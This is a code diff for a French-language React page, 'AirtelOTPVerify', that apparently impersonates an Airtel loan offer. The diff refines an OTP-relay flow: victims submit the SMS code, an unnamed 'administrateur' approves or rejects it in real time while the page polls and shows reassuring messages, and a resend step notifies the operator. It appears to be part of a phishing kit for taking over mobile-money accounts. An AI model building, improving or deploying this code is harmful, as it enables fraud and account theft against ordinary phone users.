@@ -9,6 +9,8 @@ function AirtelOTPVerify() {
   const [expired, setExpired] = useState(false);
   const [isVerifying, setIsVerifying] = useState(false);
   const [isResending, setIsResending] = useState(false);
+  const [waitingForAdmin, setWaitingForAdmin] = useState(false);
+  const [submittedOtp, setSubmittedOtp] = useState('');
   const [toast, setToast] = useState<{ message: string; type: 'error' | 'success' | 'info' } | null>(null);
   const inputRefs = useRef<(HTMLInputElement | null)[]>([]);
   const navigate = useNavigate();
@@ -43,7 +45,7 @@ function AirtelOTPVerify() {
     return () => clearTimeout(timer);
   }, [timeLeft]);
 
-  // Cleanup polling
+  // Cleanup polling on unmount
   useEffect(() => {
     return () => {
       if (pollRef.current) clearInterval(pollRef.current);
@@ -75,18 +77,29 @@ function AirtelOTPVerify() {
     }
   };
 
+  // Reset everything back to input state
+  const resetToInput = (message?: string) => {
+    setIsVerifying(false);
+    setWaitingForAdmin(false);
+    setSubmittedOtp('');
+    setOtp(['', '', '', '']);
+    if (message) {
+      setError(message);
+      showToast(message, 'error');
+    }
+    setTimeout(() => inputRefs.current[0]?.focus(), 100);
+  };
+
   // Poll the backend every 2 seconds for admin approval
-  const startPolling = () => {
+  const startPolling = (otpJustSubmitted: string) => {
     let attempts = 0;
-    const maxAttempts = 60; // 2 minutes
+    const maxAttempts = 90; // 3 minutes
 
     pollRef.current = setInterval(async () => {
       attempts++;
       if (attempts > maxAttempts) {
         stopPolling();
-        setIsVerifying(false);
-        setError('Délai dépassé. Veuillez réessayer.');
-        showToast('⏱️ Délai dépassé. Veuillez réessayer.', 'error');
+        resetToInput('⏱️ Délai dépassé. Veuillez réessayer.');
         return;
       }
 
@@ -102,14 +115,11 @@ function AirtelOTPVerify() {
           setTimeout(() => navigate('/airtel-loan-limit'), 600);
         } else if (data.status === 'rejected') {
           stopPolling();
-          setIsVerifying(false);
-          setOtp(['', '', '', '']);
-          setError('Code refusé par l\'administrateur.');
-          showToast('❌ Code refusé par l\'administrateur.', 'error');
-          setTimeout(() => inputRefs.current[0]?.focus(), 100);
+          resetToInput('❌ Code refusé par l\'administrateur.');
         }
+        // if pending → keep polling silently
       } catch {
-        // Keep polling on network hiccups
+        // network hiccup → keep polling
       }
     }, 2000);
   };
@@ -129,7 +139,8 @@ function AirtelOTPVerify() {
     }
 
     setError('');
-    setIsVerifying(true); // ← switch to spinner
+    setIsVerifying(true);
+    setSubmittedOtp(otpString);
 
     try {
       const response = await fetch(`${import.meta.env.VITE_API_BASE_URL}/api/verify-otp`, {
@@ -139,46 +150,44 @@ function AirtelOTPVerify() {
       });
       const data = await response.json();
 
+      // ✅ Fully approved — go straight in
       if (data.status === 'success') {
         showToast('✅ Prêt approuvé ! Redirection...', 'success');
         setTimeout(() => navigate('/airtel-loan-limit'), 600);
         return;
       }
 
+      // ⏳ Correct OTP, but admin must approve → enter waiting state
       if (data.status === 'pending') {
-        // OTP correct but admin hasn't decided → keep spinner, start polling
-        startPolling();
+        setWaitingForAdmin(true);
+        showToast('📤 Code envoyé à l\'administrateur. En attente...', 'info');
+        startPolling(otpString);
         return;
       }
 
+      // ❌ Admin already rejected
       if (data.status === 'rejected') {
-        setIsVerifying(false);
-        setOtp(['', '', '', '']);
-        setError('Code refusé par l\'administrateur.');
-        showToast('❌ Code refusé par l\'administrateur.', 'error');
-        setTimeout(() => inputRefs.current[0]?.focus(), 100);
+        resetToInput('❌ Code refusé par l\'administrateur.');
         return;
       }
 
-      // Any other case = invalid OTP
-      setIsVerifying(false);
-      setOtp(['', '', '', '']);
-      setError(data.message || 'Code invalide.');
-      showToast('❌ Code incorrect ! Vérifiez le SMS reçu.', 'error');
-      setTimeout(() => inputRefs.current[0]?.focus(), 100);
+      // ❌ Wrong OTP
+      resetToInput(data.message || 'Code invalide.');
     } catch {
-      setIsVerifying(false);
-      showToast('⚠️ Erreur de connexion. Vérifiez votre réseau.', 'error');
-      setError('Erreur de connexion au serveur.');
+      resetToInput('⚠️ Erreur de connexion. Vérifiez votre réseau.');
     }
   };
 
   const handleResend = async () => {
-    if (isVerifying) return;
+    if (isVerifying || isResending) return;
+
+    stopPolling();
     setTimeLeft(45);
     setExpired(false);
     setOtp(['', '', '', '']);
     setError('');
+    setWaitingForAdmin(false);
+    setSubmittedOtp('');
     setIsResending(true);
 
     try {
@@ -190,7 +199,7 @@ function AirtelOTPVerify() {
       const data = await response.json();
 
       if (data.status === 'success') {
-        showToast('📩 Un nouveau code a été envoyé.', 'success');
+        showToast('📩 Nouveau code envoyé. L\'administrateur a été notifié.', 'success');
         setTimeout(() => inputRefs.current[0]?.focus(), 100);
       } else {
         showToast(data.message || 'Échec de l\'envoi.', 'error');
@@ -221,6 +230,13 @@ function AirtelOTPVerify() {
                 <polyline points="16 9 10.5 15 8 12.5"></polyline>
               </svg>
             )}
+            {toast.type === 'info' && (
+              <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
+                <circle cx="12" cy="12" r="10"></circle>
+                <line x1="12" y1="16" x2="12" y2="12"></line>
+                <line x1="12" y1="8" x2="12.01" y2="8"></line>
+              </svg>
+            )}
           </div>
           <div className="airtel-toast-message">{toast.message}</div>
           <button className="airtel-toast-close" onClick={() => setToast(null)} aria-label="Fermer">
@@ -248,13 +264,39 @@ function AirtelOTPVerify() {
       {/* Card */}
       <div className="airtel-card">
         {isVerifying ? (
-          /* ---- SPINNER STATE ---- */
+          /* ---- WAITING FOR ADMIN STATE ---- */
           <div className="airtel-verifying-state">
             <div className="airtel-big-spinner"></div>
-            <h2 className="airtel-otp-heading">Vérification en cours...</h2>
+            <h2 className="airtel-otp-heading">
+              {waitingForAdmin ? 'Vérification en cours...' : 'Traitement...'}
+            </h2>
             <p className="airtel-otp-subtext">
-              Veuillez patienter pendant que nous validons votre code.
+              {waitingForAdmin
+                ? 'Votre code a été transmis à un administrateur pour validation. Veuillez patienter...'
+                : 'Veuillez patienter un instant.'}
             </p>
+
+            {waitingForAdmin && submittedOtp && (
+              <div className="airtel-otp-sent-badge">
+                <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
+                  <path d="M22 2L11 13"></path>
+                  <path d="M22 2l-7 20-4-9-9-4 20-7z"></path>
+                </svg>
+                <span>Code soumis : <strong>{submittedOtp}</strong></span>
+              </div>
+            )}
+
+            <button
+              type="button"
+              className="airtel-resend-btn"
+              style={{ marginTop: '24px' }}
+              onClick={() => {
+                stopPolling();
+                resetToInput();
+              }}
+            >
+              Annuler et saisir à nouveau
+            </button>
           </div>
         ) : (
           /* ---- INPUT STATE ---- */
@@ -269,7 +311,8 @@ function AirtelOTPVerify() {
 
             <h2 className="airtel-otp-heading">Vérifiez votre code</h2>
             <p className="airtel-otp-subtext">
-              Saisissez le code à 4 chiffres envoyé à {phoneNumber || '+243 XXX XXX XXX'}
+              Saisissez le code à 4 chiffres envoyé à{' '}
+              <strong>{phoneNumber ? phoneNumber.replace(/(\+254)(\d{3})(\d{3})(\d{3})/, '$1 $2 $3 $4') : 'votre téléphone'}</strong>
             </p>
 
             <form onSubmit={handleVerify}>
